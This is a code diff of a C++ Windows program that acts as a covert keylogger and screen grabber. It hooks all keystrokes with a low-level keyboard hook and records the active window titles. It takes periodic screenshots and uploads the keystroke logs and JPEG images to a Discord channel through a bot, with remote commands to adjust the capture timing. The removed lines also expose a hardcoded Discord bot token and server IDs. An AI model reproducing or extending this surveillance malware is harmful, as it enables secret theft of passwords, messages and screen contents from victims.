@@ -1,36 +1,4 @@
-#define _CRT_SECURE_NO_WARNINGS     //fuck msvc
-#define UNICODE
-
-#pragma once
-//Visual Studio put /external:W0 AFTER /W4, hence defeat the purpose of suppress
-//external headers warning (there are ways too much warnings there). This is workaround
-#pragma warning (push, 0)
-#include <dpp/cluster.h>
-#include <dpp/once.h>
-
-#include <cstdio>
-#include <ctime>
-#include <cassert>
-#include <fstream>
-#include <iostream>
-#include <map>
-#include <vector>
-#include <functional>
-#include <thread>
-#include <mutex>
-#include <condition_variable>
-#include <queue>
-#include <algorithm>
-#include <list>
-#include <filesystem>
-
-#include <windows.h>
-#include <ShlObj.h>
-#include <Gdiplus.h>
-
-#define NOMINMAX //get rid of windef.h bad max/min impl, place here so that it won't brok gdiplus
-
-#pragma warning (pop)
+#include "MyBot.h"
 
 // #define sh_winapi_success(x) assert(x == S_OK)
 // #define winapi_success(x) assert(x != 0)
@@ -54,84 +22,22 @@ std::condition_variable condvar;
 
 ULONG_PTR GDIPLUS_TOKEN;
 
-struct COMMAND_LINE_OPTION {
-	static inline std::string BOT_TOKEN = "Nzk1MjgzNjM2MDg1MzI1ODI1.Gi9kUj.ZBA78aLZeE_ZNnQuQM3LYIXTIfq11eYNMcUKbk";
-	static inline unsigned long long BOT_GUILD_ID = 664744934003310592;
-	static inline unsigned long long BOT_CHANNEL_ID = 1056052934921699388;
-	static inline bool COMPRESSED_MODE = false;
+std::string version_string;
 
-	COMMAND_LINE_OPTION() = delete;
-	COMMAND_LINE_OPTION(COMMAND_LINE_OPTION&& op) = delete;
-};
+template <typename T>
+constexpr T OURMIN(const T& a, const T& b) {
+	return a < b ? a : b;
+}
 
 //won't create any local files except the running log. Use list for better
 //optimization in concurrent element accessing and removing elements.
 std::list<std::string> file_list;
 
-const std::map<const dpp::loglevel, const std::string> DPP_LOGLEVEL_MAP {
-	{dpp::loglevel::ll_trace, "[TRACE] "},
-	{dpp::loglevel::ll_debug, "[DEBUG] "},
-	{dpp::loglevel::ll_info, "[INFO] "},
-	{dpp::loglevel::ll_warning, "[WARN] "},
-	{dpp::loglevel::ll_error, "[ERORR] "},
-	{dpp::loglevel::ll_critical, "[CRITICAL!] "},
-};
-
-const std::map<int, std::string> keyname{ 
-	{VK_BACK, "[BKSPACE]" },
-	{VK_RETURN,	"[ENTER]" },
-	{VK_SPACE,	"[SPACE]" },
-	{VK_TAB,	"[TAB]" },
-	{VK_SHIFT,	"[SHIFT]" },
-	{VK_LSHIFT,	"[LSHIFT]" },
-	{VK_RSHIFT,	"[RSHIFT]" },
-	{VK_CONTROL,	"[CTRL]" },
-	{VK_LCONTROL,	"[LCTRL]" },
-	{VK_RCONTROL,	"[LCTRL]" },
-	{VK_MENU,	"[ALT]" },
-	{VK_LWIN,	"[LWIN]" },
-	{VK_RWIN,	"[RWIN]" },
-	{VK_ESCAPE,	"[ESCAPE]" },
-	{VK_END,	"[END]" },
-	{VK_HOME,	"[HOME]" },
-	{VK_LEFT,	"[LEFT]" },
-	{VK_RIGHT,	"[RIGHT]" },
-	{VK_UP,		"[UP]" },
-	{VK_DOWN,	"[DOWN]" },
-	{VK_PRIOR,	"[PGUP]" },
-	{VK_NEXT,	"[PGDOWN]" },
-	{VK_OEM_PERIOD,	"." },
-	{VK_DECIMAL,	"." },
-	{VK_OEM_PLUS,	"+" },
-	{VK_OEM_MINUS,	"-" },
-	{VK_ADD,		"+" },
-	{VK_SUBTRACT,	"-" },
-    {VK_NUMLOCK, "[NUMLK]"},
-	{VK_CAPITAL,	"[CAPSLK]" },
-	{VK_DELETE, "[DELETE]"},
-    {VK_F1, "[F1]"}, 
-    {VK_F2, "[F2]"}, 
-    {VK_F3, "[F3]"}, 
-    {VK_F4, "[F4]"}, 
-    {VK_F5, "[F5]"}, 
-    {VK_F6, "[F6]"}, 
-    {VK_F7, "[F7]"}, 
-    {VK_F8, "[F8]"}, 
-    {VK_F9, "[F9]"}, 
-    {VK_F10, "[F10]"}, 
-    {VK_F11, "[F11]"}, 
-    {VK_F12, "[F12]"}, 
-    {VK_VOLUME_MUTE, "[VOLUME_MUTE]"},
-    {VK_VOLUME_DOWN, "[VOLUME_DOWN]"},
-    {VK_VOLUME_UP, "[VOLUME_UP]"},
-    {VK_MEDIA_NEXT_TRACK, "[MEDIA_NEXT]"},
-    {VK_MEDIA_PREV_TRACK, "[MEDIA_PREV]"},
-    {VK_MEDIA_STOP, "[MEDIA_STOP]"},
-    {VK_MEDIA_PLAY_PAUSE, "[MEDIA_PLAY_PAUSE]"}
-};
+//Store previous hash value when hashing/comparing captured image 
+std::vector<long long> linehash;
 
 std::unique_ptr<dpp::cluster> bot;
-dpp::message keymsg, imagemsg;
+dpp::message keymsg, imagemsg, logmsg;
 
 inline void wide_char_to_mb(WCHAR* input, char* output, int outputbuf) {
 	WideCharToMultiByte(CP_UTF8, 0, input, -1, output, outputbuf, NULL, NULL);
@@ -153,6 +59,13 @@ inline void logger(const char* format, ...) {
 
 	logger_file.write(__buf, strlen(__buf));
 	logger_file.flush();
+
+    // std::string str(__buf);
+    // logmsg.set_content(str);
+    // bot->message_create(logmsg, [](const dpp::confirmation_callback_t& loghandle) {
+	// 	exit(-1);   //fatal, must stop, or restart
+    // });
+
 }
 
 /// @brief Print to container.
@@ -171,163 +84,264 @@ inline void print_to(const char* format, ...) {
 	file_list.back().append(__buf);
 }
 
+/// @brief Marco for "safe error handling", unused
+/// @param func [in] Function name
+/// @param okval [in] Value need to be return when the function sucessfully called
+/// @param last_error_info Varible to pass failed function name for debugging
+/// @param err_ret_expr [in] Expression to call when to function fail. Can be anything in caller's function code
+                            ///Multiline code should be wrapped in curly bracket.
+/// @param ... the argument pass to function specified by func
+#define SCALL(func, okval, last_error_info, err_ret_expr,...) if(func(__VA_ARGS__) != okval) { \
+                                                last_error_info = #func; \
+                                                err_ret_expr; \
+                                                }
+
+
 /*Return -1 if fail, non-negative if success*/
-int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
-    UINT  num = 0;          // number of image encoders
-    UINT  size = 0;         // size of the image encoder array in bytes
+int MakeBitmapStruct::GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
+	UINT  num = 0;          // number of image encoders
+	UINT  size = 0;         // size of the image encoder array in bytes
 
-    Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;
+	// Gdiplus::Status callStatus;
+	Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;
 
-    Gdiplus::GetImageEncodersSize(&num, &size);
-    if(size == 0) return -1;  // Failure
+	// SCALL(Gdiplus::GetImageEncodersSize, Gdiplus::Ok, err_string, {}, &num, &size);
+	Gdiplus::GetImageEncodersSize(&num, &size);
+	if(size == 0) return -1;  // Failure
 
-    pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
-    if(pImageCodecInfo == NULL) return -1;  // Failure
+	pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
+	if(pImageCodecInfo == NULL) return -1;  // Failure
 
-    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
+	Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
 
-    for(UINT j = 0; j < num; ++j) {
-        if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 ) {
-            *pClsid = pImageCodecInfo[j].Clsid;
-            free(pImageCodecInfo);
-            return j;  // Success
-        }    
-    }
+	for(UINT j = 0; j < num; ++j) {
+		if( wcscmp(pImageCodecInfo[j].MimeType, format) == 0 ) {
+			*pClsid = pImageCodecInfo[j].Clsid;
+			free(pImageCodecInfo);
+			return j;  // Success
+		}    
+	}
 
-    free(pImageCodecInfo);
-    return -1;  // Failure
+	free(pImageCodecInfo);
+	return -1;  // Failure
 }
+
+long long MakeBitmapStruct::hash(char *block, int size, long long mod, int base) {
+	long long ans = 0;
+	long long cbase = base;
+	for(int i=0; i < size; i++) {
+		ans = ans + ((((long long) block[i] + 129)*cbase) % mod);
+		ans %= mod;
+		cbase = (cbase * base) % mod;
+	}
+	return ans;
+}
+
+MakeBitmapStruct::MakeBitmapStruct(long long thashmod, int thashbase) {
+	hashmod = thashmod;
+	hashbase = thashbase;
+}
+
+MakeBitmapStruct::~MakeBitmapStruct() {
+	if(freelim >= 1) ReleaseDC(NULL, hDC);
+	if(freelim >= 2) DeleteDC(hMemDC);
+	if(freelim >= 3) DeleteObject(hBitmap);
+	if(freelim >= 4) free(memblock);
+	if(freelim >= 5) free(jpg_stat);
+	if(freelim >= 6) rawbitmap_stream->Release();
+	if(freelim >= 7) jpg_stream->Release();
+}
+
 
 /// @brief Capture screenshot
 /// @param allocatedJPG [out] Pointer to the pointer contain allocated memory. Caller clean-up
 /// @param allocatedsize [out] size of the allocated memory
-/// @return 0 is success, otherwise fail; Buffer must be cleaned up using C function free()
-int WINAPI MakeBitmap(char **allocatedJPG, unsigned int* allocatedsize) {
-    BITMAPFILEHEADER bfHeader;
-    BITMAPINFOHEADER biHeader;
-    BITMAPINFO bInfo;
-    HGDIOBJ hTempBitmap;
-    HBITMAP hBitmap;
-    BITMAP bAllDesktops;
-    HDC hDC, hMemDC;
-    LONG lWidth, lHeight;
-    BYTE *bBits = NULL;
-    DWORD cbBits, dwWritten = 0;
-    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
-    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);
-    int returncode = 0;
+/// @param hs [in] the factor for the hash check function. Value must be 0 to skip the check 
+/// @return 0 is success, 0xFF(255) if the image is considered duplicated 
+/// with previous shot; otherwise fail; Buffer must be cleaned up using C function free()
+int WINAPI MakeBitmapStruct::MakeBitmap(char **allocatedJPG, unsigned int* allocatedsize, unsigned int hs) {
+	freelim = 0;
 
-    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
-    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
-    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
-    ZeroMemory(&bAllDesktops, sizeof(BITMAP));
+	BITMAPFILEHEADER bfHeader;
+	BITMAPINFOHEADER biHeader;
+	BITMAPINFO bInfo;
+	HGDIOBJ hTempBitmap;
+	BITMAP bAllDesktops;
+	LONG width, height;
+	BYTE *bBits = NULL;
+	DWORD cbBits, dwWritten = 0;
+	INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
+	INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);
+	int returncode = 0;
 
-    hDC = GetDC(NULL);
-    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
-    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);
+	ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
+	ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
+	ZeroMemory(&bInfo, sizeof(BITMAPINFO));
+	ZeroMemory(&bAllDesktops, sizeof(BITMAP));
 
-    lWidth = bAllDesktops.bmWidth;
-    lHeight = bAllDesktops.bmHeight;
+	hDC = GetDC(NULL);
+	if(hDC == NULL) {
+		return 1;
+	}
+	freelim++;
 
-    DeleteObject(hTempBitmap);
+	hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
+	if(hTempBitmap == NULL) {
+		return 2;
+	}
 
-    bfHeader.bfType = (WORD)('B' | ('M' << 8));
-    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+	if(GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops) == 0) {
+		return 3;
+	}
 
-    biHeader.biSize = sizeof(BITMAPINFOHEADER);
-    biHeader.biBitCount = 24;
-    biHeader.biCompression = BI_RGB;
-    biHeader.biPlanes = 1;
-    biHeader.biWidth = lWidth;
-    biHeader.biHeight = lHeight;
+	width = bAllDesktops.bmWidth;
+	height = bAllDesktops.bmHeight;
 
-    bInfo.bmiHeader = biHeader;
+	DeleteObject(hTempBitmap);
 
-    cbBits = (((24 * lWidth + 31)&~31) / 8) * lHeight;
+	bfHeader.bfType = (WORD)('B' | ('M' << 8));
+	bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
 
-    hMemDC = CreateCompatibleDC(hDC);
-    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID **)&bBits, NULL, 0);
-    SelectObject(hMemDC, hBitmap);
-    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);
+	biHeader.biSize = sizeof(BITMAPINFOHEADER);
+	biHeader.biBitCount = 24;
+	biHeader.biCompression = BI_RGB;
+	biHeader.biPlanes = 1;
+	biHeader.biWidth = width;
+	biHeader.biHeight = height;
 
-    //compress
+	bInfo.bmiHeader = biHeader;
 
-    CLSID pngClsid;
+	cbBits = (((24 * width + 31)&~31) / 8) * height;
 
-    LARGE_INTEGER __TEMP_SEEK_OFFSET;
-    __TEMP_SEEK_OFFSET.QuadPart = 0;
+	hMemDC = CreateCompatibleDC(hDC);
+	if(hMemDC == NULL) {
+		return 4;
+	}
+	freelim++;
 
-    IStream *rawbitmap_stream, *jpg_stream = NULL;
-    STATSTG *jpg_stat = (STATSTG*) malloc(sizeof(STATSTG));
+	hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID **)&bBits, NULL, 0);
+	if(hBitmap == NULL) {
+		return 5;    
+	}
+	freelim++;
 
-    unsigned int memblocksize = (unsigned int) sizeof(BITMAPFILEHEADER) + (unsigned int) sizeof(BITMAPINFOHEADER) + cbBits;
-    char *memblock = (char*) malloc(memblocksize);
-    memcpy(memblock, &bfHeader, sizeof(BITMAPFILEHEADER));
-    memcpy(memblock + sizeof(BITMAPFILEHEADER), &biHeader, sizeof(BITMAPINFOHEADER));
-    memcpy(memblock + (sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)), bBits, cbBits);
+	SelectObject(hMemDC, hBitmap);
+	if(BitBlt(hMemDC, 0, 0, width, height, hDC, x, y, SRCCOPY) == 0) {
+		return 6;
+	}
 
-    CreateStreamOnHGlobal(NULL, TRUE, &rawbitmap_stream);
-    CreateStreamOnHGlobal(NULL, TRUE, &jpg_stream);
-    rawbitmap_stream->Write(memblock, memblocksize, &dwWritten);    
+	unsigned int memblocksize = (unsigned int) sizeof(BITMAPFILEHEADER) + (unsigned int) sizeof(BITMAPINFOHEADER) + cbBits;
+	memblock = (char*) malloc(memblocksize);
+	memcpy(memblock, &bfHeader, sizeof(BITMAPFILEHEADER));
+	memcpy(memblock + sizeof(BITMAPFILEHEADER), &biHeader, sizeof(BITMAPINFOHEADER));
+	memcpy(memblock + (sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)), bBits, cbBits);
+	freelim++;
 
-    Gdiplus::Image image(rawbitmap_stream);
+    if(hs != 0) {
+        //hash check. False detection is very possible. Should only be run when no key is typing 
+        std::vector<long long> tlinehash (height*hs);
+        int proc = width/hs;
+        int proc2 = proc + (width % hs);
+        for(int i=0; i < height; i++) {
+            for(int j=0; j < hs-1; j++) {
+                tlinehash[i*hs+j] = hash(memblock+(width*i+proc*j), proc, hashmod, hashbase);
+            }
+            tlinehash[i*hs+(hs-1)] = hash(memblock+(width*i+proc*(hs-1)), proc2, hashmod, hashbase);
+        }
+        if(tlinehash.size() == linehash.size()) {
+            int matchcnt = 0;
+            for(int i=0; i < tlinehash.size(); i++) {
+                if(tlinehash[i] == linehash[i]) matchcnt++;
+            }
+            float flt = (float) matchcnt / tlinehash.size();
+            if(flt > 0.95f) {
+                return 0xFF;
+            }
+        }
 
-    if(GetEncoderClsid(L"image/jpeg", &pngClsid) == -1) {
-        returncode = -2;
-        goto __retlabel;
+        linehash = tlinehash;
     }
 
-    if(image.Save(jpg_stream, &pngClsid, NULL) != Gdiplus::Ok) {
-        returncode = -1;
-        goto __retlabel;
-    }
+	//compress
 
-    jpg_stream->Stat(jpg_stat, 1); //specified no name
-    *allocatedsize = (unsigned int) jpg_stat->cbSize.QuadPart;
-    *allocatedJPG = (char*) malloc(*allocatedsize);
+	CLSID pngClsid;
 
-    //seek back to beginning to read
-    if(jpg_stream->Seek(__TEMP_SEEK_OFFSET, STREAM_SEEK_SET, NULL) != S_OK) {
-        returncode = -2;
-        goto __retlabel;
-    }
-    if(jpg_stream->Read(*allocatedJPG, *allocatedsize, &dwWritten) != S_OK) {
-        returncode = -2;
-        goto __retlabel;
-    }
+	LARGE_INTEGER __TEMP_SEEK_OFFSET;
+	__TEMP_SEEK_OFFSET.QuadPart = 0;
 
-    __retlabel:
-    DeleteDC(hMemDC);
-    ReleaseDC(NULL, hDC);
-    DeleteObject(hBitmap);
+	jpg_stat = (STATSTG*) malloc(sizeof(STATSTG));
+	HRESULT hr;
 
-	jpg_stream->Release();
-    rawbitmap_stream->Release();
-    free(jpg_stat);
-    free(memblock);
+	freelim++;
+
+	rawbitmap_stream = NULL; 
+	hr = CreateStreamOnHGlobal(NULL, TRUE, &rawbitmap_stream);
+	if(hr == E_INVALIDARG) {
+		return -5;
+	} else if(hr == E_OUTOFMEMORY) {
+		return -6;
+	}
+	freelim++;
+
+	jpg_stream = NULL;
+	hr = CreateStreamOnHGlobal(NULL, TRUE, &jpg_stream);
+	if(hr == E_INVALIDARG) {
+		return -7;
+	} else if(hr == E_OUTOFMEMORY) {
+		return -8;
+	}
+	freelim++;
+	
+	if(rawbitmap_stream->Write(memblock, memblocksize, &dwWritten) != S_OK) {
+		return -1;
+	}   
+
+	Gdiplus::Image image(rawbitmap_stream);
+
+	if(GetEncoderClsid(L"image/jpeg", &pngClsid) == -1) {
+		return -2;
+	}
+
+	if(image.Save(jpg_stream, &pngClsid, NULL) != Gdiplus::Ok) {
+		return -3;
+	}
+
+	jpg_stream->Stat(jpg_stat, 1); //specified no name
+	*allocatedsize = (unsigned int) jpg_stat->cbSize.QuadPart;
+	*allocatedJPG = (char*) malloc(*allocatedsize);
+
+	//seek back to beginning to read
+	if(jpg_stream->Seek(__TEMP_SEEK_OFFSET, STREAM_SEEK_SET, NULL) != S_OK) {
+		free(allocatedJPG);
+		return -3;
+	}
+	if(jpg_stream->Read(*allocatedJPG, *allocatedsize, &dwWritten) != S_OK) {
+		free(allocatedJPG);
+		return -4;
+	}
+
 	return returncode;
 }
 
-// void send_data(std::string& err) {
-void send_data() {
-	while(true) {
-		std::this_thread::sleep_for(std::chrono::minutes(1));	//test
+std::mutex send_key_mx;
 
-		std::string err = "ok!";	//temp
-		bool __is_failed = false;
+// void send_key(std::string& err) {
+void send_key(bool from_schedule = false) {
 
-		//new write location!
-		file_list.push_back(std::string());
-		while(file_list.size() > 1) {
-			
-			if(file_list.begin()->size() > 0) {
-				//for "safety issue" and since file are 7 mb each so we would send everyfile one by one
-				//filename when upload to discord is unnecessary, so let it in order
-				keymsg.add_file(std::to_string(key_fileindex).append(".txt"), file_list.front());
-			} else {
-				keymsg.set_content("No key data recorded yet!");
-			}
-			
+	send_key_mx.try_lock();
+	std::string err = "ok!";	//temp
+	bool __is_failed = false;
+
+	//new write location!
+	file_list.push_back(std::string());
+	while(file_list.size() > 1) {
+		
+		if(file_list.begin()->size() > 0) {
+			//for "safety issue" and since file are 7 mb each so we would send everyfile one by one
+			//filename when upload to discord is unnecessary, so let it in order
+			keymsg.add_file(std::to_string(key_fileindex).append(".txt"), file_list.front());
+			if(from_schedule) keymsg.set_content("Data sent from schedule!");
+			else keymsg.set_content("Data sent!");
 			bot->message_create(keymsg, [&err, &__is_failed](const dpp::confirmation_callback_t& eventret) {
 				if (eventret.is_error()) {
 					err = eventret.get_error().message;
@@ -336,68 +350,53 @@ void send_data() {
 				}
 			});
 			key_fileindex++;
-			keymsg.filename.clear();
-			keymsg.filecontent.clear();
-			keymsg.set_content("Data sent!");
-			if(__is_failed) return;
-			
-			file_list.erase(file_list.begin());
 		}
-
-		// //image data!
-		// WCHAR jpg_path[MAX_PATH+5];
-		// CHAR mbjpg_path[MAX_PATH+75];
-		// WCHAR __jpg_path_numtostring[31];
-		// char *jpg_buffer;
-		// size_t jpg_size = 0;
-		// wcscpy(bitmap_path, local_appdata_path);
-		// wcscat(bitmap_path, L"\\bitmap.bmp");
-
-		// swprintf(__jpg_path_numtostring, L"\\%llu.jpg", image_fileindex);
-		// wcscpy(jpg_path, local_appdata_path);
-		// wcscat(jpg_path, __jpg_path_numtostring);
-
-		// SaveBitmap(bitmap_path);
-		// CompressBitmap(bitmap_path, jpg_path);
-
-		char *jpg_buffer;
-		unsigned int jpg_size;
-		MakeBitmap(&jpg_buffer, &jpg_size);
-
-		// ifstream jpg_infile(std::filesystem::path(jpg_path), std::ios::in);
-		// jpg_infile.seekg(0, jpg_infile.end);
-		// jpg_size = jpg_infile.tellg();
-		// jpg_infile.seekg(0, jpg_infile.beg);
-		// jpg_buffer = new char[jpg_size];
-		// jpg_infile.read(jpg_buffer, jpg_size);
-		// if(!jpg_infile) {
-		// 	//Fail
-		// }
+		keymsg.filename.clear();
+		keymsg.filecontent.clear();
+		// if(__is_failed) return;
 		
-		// wide_char_to_mb(jpg_path, mbjpg_path, wcslen(jpg_path));
-		// imagemsg.add_file(std::string(mbjpg_path), std::string(jpg_buffer));
-		imagemsg.add_file(std::to_string(image_fileindex).append(".jpg"), std::string(jpg_buffer, jpg_size));
-		
-		//cleanup first
-		// delete[] jpg_buffer;
-		// jpg_infile.close();
-		// DeleteFile(jpg_path);
-		// DeleteFile(bitmap_path);
-		free(jpg_buffer);
+		file_list.erase(file_list.begin());
+	}
+	send_key_mx.unlock();
+	
+}
 
-		//fix fix this
-		bot->message_create(imagemsg, [&err, &__is_failed](const dpp::confirmation_callback_t& eventret) {
-			if (eventret.is_error()) {
-				err = eventret.get_error().message;
-				__is_failed = true;
-				return dpp::utility::log_error()(eventret);
+void send_bitmap() {
+	while(true) {
+		MakeBitmapStruct mbs;
+
+		std::this_thread::sleep_for(std::chrono::seconds(COMMAND_LINE_OPTION.SEND_BITMAP_INTERVAL));	//test
+
+		std::string err = "ok!";	//temp
+		bool __is_failed = false;
+
+		char *jpg_buffer = NULL;
+		unsigned int jpg_size = 0;
+		int status = mbs.MakeBitmap(&jpg_buffer, &jpg_size, COMMAND_LINE_OPTION.DEFAULT_HS);
+		
+		if(status == 0xFF) {
+			free(jpg_buffer);
+		} else {
+			if(status == 0) {
+				imagemsg.set_content("Image sent!");
+				imagemsg.add_file(std::to_string(image_fileindex).append(".jpg"), std::string(jpg_buffer, jpg_size));
+				free(jpg_buffer);
+			} else {
+				imagemsg.set_content("Fail to capture image! Error " + std::to_string(status));
 			}
-		});
-		image_fileindex++;
-		imagemsg.filename.clear();
-		imagemsg.filecontent.clear();
-		if(__is_failed) return;
 
+			bot->message_create(imagemsg, [&err, &__is_failed](const dpp::confirmation_callback_t& eventret) {
+				if (eventret.is_error()) {
+					err = eventret.get_error().message;
+					// __is_failed = true;
+					return dpp::utility::log_error()(eventret);
+				}
+			});
+			image_fileindex++;
+			imagemsg.filename.clear();
+			imagemsg.filecontent.clear();
+			// if(__is_failed) return;
+		}
 	}
 }
 
@@ -462,7 +461,10 @@ int Save(int key_stroke) {
 		WCHAR window_title[260];
 		char mbwindow_title[260], s[64];
 		
-		GetWindowTextW(foreground, window_title, 256);
+		if(GetWindowTextW(foreground, window_title, 256) == 0) {
+			wcscpy(window_title, L"[[empty windows title]]");
+		}
+
 		if (wcscmp(window_title, lastwindow) != 0)
 		{
 			wcscpy(lastwindow, window_title);
@@ -540,15 +542,6 @@ inline void preinit() {
 	wcscpy(__logfilepath, local_appdata_path);
 	wcscat(__logfilepath, LOGGER_FILENAME);
 
-	// //Pre-create the file and make it hidden; next time open and write to it
-	// HANDLE __ico_file_handle = CreateFileW(file_path,
-    //                                     GENERIC_READ | GENERIC_WRITE, 
-    //                                     0, 
-    //                                     NULL, 
-    //                                     CREATE_ALWAYS, 
-    //                                     FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NORMAL,
-    //                                     NULL);
-	// CloseHandle(__ico_file_handle);
 	logger_file.open(std::filesystem::path(__logfilepath), std::ios::app);
 
 	if(!logger_file) {
@@ -565,21 +558,25 @@ inline void preinit() {
 		strftime(__timestr, sizeof(__timestr), "%c", __timestruct);
 	}
 
-	// logging
-	logger("\nHello world! Current time is %s\n", __timestr);
+	//version string
+	char buffer[1001];
 	#if defined(__GNUC__)
-        logger("Built with GCC %d.%d.%d ", __GNUC__, __GNUC_MINOR__, __GNUC_PATCHLEVEL__);
+        snprintf(buffer, 1001, "Built with GCC %d.%d.%d ", __GNUC__, __GNUC_MINOR__, __GNUC_PATCHLEVEL__);
         #if defined(__MINGW64__)
-            logger("(MinGW-w64 %d.%d) ", __MINGW64_VERSION_MAJOR, __MINGW64_VERSION_MINOR);
+            snprintf(buffer, 1001, "(MinGW-w64 %d.%d) ", __MINGW64_VERSION_MAJOR, __MINGW64_VERSION_MINOR);
         #elif defined(__MINGW32__)
-            logger("(MinGW %d.%d) ", __MINGW32_MAJOR_VERSION, __MINGW32_MINOR_VERSION);
+            snprintf(buffer, 1001, "(MinGW %d.%d) ", __MINGW32_MAJOR_VERSION, __MINGW32_MINOR_VERSION);
         #endif
     #elif defined(_MSC_VER)
-        logger("Built with MSVC %d ", _MSC_VER);
+        snprintf(buffer, 1001, "Built with MSVC %d ", _MSC_VER);
     #else
-        logger("Built with unknown compiler ");
+        snprintf(buffer, 1001, "Built with unknown compiler ");
     #endif
-        logger("on %s at %s. %d-bit build\nDPP version: %s\n", __DATE__, __TIME__, sizeof(void*) << 3, dpp::utility::version().c_str());
+	version_string = std::string(buffer);
+	snprintf(buffer, 1001, "on %s at %s. %d-bit build\nDPP version: %s\n", __DATE__, __TIME__, sizeof(void*) << 3, dpp::utility::version().c_str());
+	version_string += std::string(buffer);
+	// logging
+	logger("\nHello world! Current time is %s\n%s", __timestr, version_string.c_str());
 }
 
 void logrun()
@@ -593,7 +590,10 @@ void logrun()
 		exit(EXIT_FAILURE);
 	}
 
-	if (!(_hook = SetWindowsHookExW(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
+	_hook = SetWindowsHookExW(WH_KEYBOARD_LL, HookCallback, NULL, 0);
+	if (_hook != NULL) {
+		logger("[INFO] Key hook initialized!\n");
+	} else {
 		logger("[CRITICAL!] Failed to install hook. Terminating...\n");
 		exit(EXIT_FAILURE);
 	}
@@ -603,12 +603,32 @@ void logrun()
 	}
 }
 
+// RAIISlashCommandStruct::RAIISlashCommandStruct() {
+// 	bot->global_command_create(dpp::slashcommand("ping", "Ping pong!", bot->me.id));
+// 	bot->global_command_create(dpp::slashcommand("version", "version", bot->me.id));
+// 	bot->global_command_create(dpp::slashcommand("changehs", "change image hash factor", bot->me.id)
+// 								.add_option(dpp::command_option(dpp::co_integer, "val", "enter val", true)
+// 												.set_max_value(100ll).set_min_value(0ll)
+// 											));
+// }
+
+// RAIISlashCommandStruct::~RAIISlashCommandStruct() {
+// 	if (dpp::run_once<struct register_bot_commands>()) {
+// 	bot->global_commands_get([](const dpp::confirmation_callback_t &eventret) {
+// 		dpp::slashcommand_map slashcmd_mapper = eventret.get<dpp::slashcommand_map>();
+// 		for(auto& pp:slashcmd_mapper) {
+// 			bot->global_command_delete(pp.first);
+// 		}
+// 	});
+// 	}
+// }
+
 void botrun()
 {
 	is_bot_connected = 0;
     try {
         /* Create bot cluster */
-        bot = std::unique_ptr<dpp::cluster>(new dpp::cluster(COMMAND_LINE_OPTION::BOT_TOKEN,
+        bot = std::unique_ptr<dpp::cluster>(new dpp::cluster(COMMAND_LINE_OPTION.BOT_LOCATION[1],	//token
             dpp::i_default_intents,
             0, 0, 2, true,
             { dpp::cp_aggressive, dpp::cp_aggressive, dpp::cp_aggressive },
@@ -623,36 +643,68 @@ void botrun()
 		bot->on_slashcommand([](const dpp::slashcommand_t& event) {
 			size_t issuing_user = event.command.get_issuing_user().id;
 			std::string issuing_command = event.command.get_command_name();
+			char buffer[1001];
 			if (issuing_command == "ping") {
-				char buffer[1001];
 				snprintf(buffer, 1000, "Pong! %f ms", bot->rest_ping);
 				event.reply(buffer);
 			}
 			if (issuing_command == "version") {
-				char buffer[1001];
-				snprintf(buffer, 1000, "Hello world! Running on %s. Current time is %s",
-					dpp::utility::version().c_str(),
-					dpp::utility::current_date_time().c_str());
+				snprintf(buffer, 1000, "%s", version_string.c_str());
+				event.reply(buffer);
+			}
+			if (issuing_command == "changehs") {
+				COMMAND_LINE_OPTION.DEFAULT_HS = (unsigned int) event.command.get_command_interaction().get_value<int64_t>(0);
+				snprintf(buffer, 1000, "Capture check factor changed to %u!", COMMAND_LINE_OPTION.DEFAULT_HS);
+				event.reply(buffer);
+			}
+			if (issuing_command == "keytime") {
+				COMMAND_LINE_OPTION.SEND_KEY_INTERVAL = (unsigned int) event.command.get_command_interaction().get_value<int64_t>(0);
+				snprintf(buffer, 1000, "Key sending interval changed to %um!", COMMAND_LINE_OPTION.SEND_KEY_INTERVAL);
+				event.reply(buffer);
+			}
+			if (issuing_command == "bitmaptime") {
+				COMMAND_LINE_OPTION.SEND_BITMAP_INTERVAL = (unsigned int) event.command.get_command_interaction().get_value<int64_t>(0);
+				snprintf(buffer, 1000, "Bitmap sending interval changed to %us!", COMMAND_LINE_OPTION.SEND_BITMAP_INTERVAL);
 				event.reply(buffer);
 			}
 			logger("[INFO] User %llu executed %s\n", issuing_user, issuing_command.c_str());
         });
 
 		keymsg = dpp::message(bot.get());
-		keymsg.set_guild_id(COMMAND_LINE_OPTION::BOT_GUILD_ID);
-		keymsg.set_channel_id(COMMAND_LINE_OPTION::BOT_CHANNEL_ID);
+		keymsg.set_guild_id(COMMAND_LINE_OPTION.BOT_LOCATION[2]);
+		keymsg.set_channel_id(COMMAND_LINE_OPTION.BOT_LOCATION[3]);
 
